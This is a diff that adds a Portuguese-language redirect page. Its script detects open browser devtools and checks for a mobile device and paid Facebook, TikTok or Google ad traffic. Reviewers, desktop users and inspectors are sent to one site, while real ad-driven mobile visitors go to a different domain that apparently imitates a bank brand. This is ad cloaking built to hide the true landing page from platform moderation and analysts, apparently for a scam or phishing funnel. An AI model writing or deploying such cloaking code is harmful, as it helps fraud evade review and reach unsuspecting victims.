@@ -1,0 +1,63 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecionamento</title>
+</head>
+<body>
+    <script>
+        (function () {
+            // Verifica se é dispositivo móvel
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|Windows Phone/i.test(navigator.userAgent);
+            const urlParams = new URLSearchParams(window.location.search);
+
+            // FACEBOOK
+            const utmCampaign = urlParams.get('utm_campaign');
+            const isFacebook = utmCampaign && /CBO|ABO/.test(utmCampaign);
+
+            // TIKTOK
+            const utmSource = urlParams.get('utm_source');
+            const utmMedium = urlParams.get('utm_medium');
+            const isTikTok = utmSource === 'tiktok' && utmMedium === 'paid';
+
+            // GOOGLE
+            const gclid = urlParams.get('gclid');
+            const isGoogle = gclid !== null || (utmSource === 'google' && utmMedium === 'cpc');
+
+            // TRAFÉGO VÁLIDO
+            const isValidTraffic = isFacebook || isTikTok || isGoogle;
+
+            // DETECÇÃO DE DEVTOOLS
+            let devtoolsOpen = false;
+            const element = new Image();
+            Object.defineProperty(element, 'id', {
+                get: function () {
+                    devtoolsOpen = true;
+                }
+            });
+            console.log('%c', element);
+
+            // Executa a verificação imediatamente
+            if (devtoolsOpen || !isMobile || !isValidTraffic) {
+                window.location.replace('https://nu-solicite.site/consult/?');
+            } else {
+                const baseUrl = "https://www.nusolucoes.cfd/";
+                // Verifica se há parâmetros para evitar adicionar "?" desnecessário
+                const paramsString = urlParams.toString();
+                const redirectUrl = paramsString ? `${baseUrl}?${paramsString}` : baseUrl;
+                window.location.replace(redirectUrl);
+            }
+        })();
+    </script>
+    <script>
+  window.pixelId = "67e382c47c6c993bb57565a3";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+</body>
+</html>
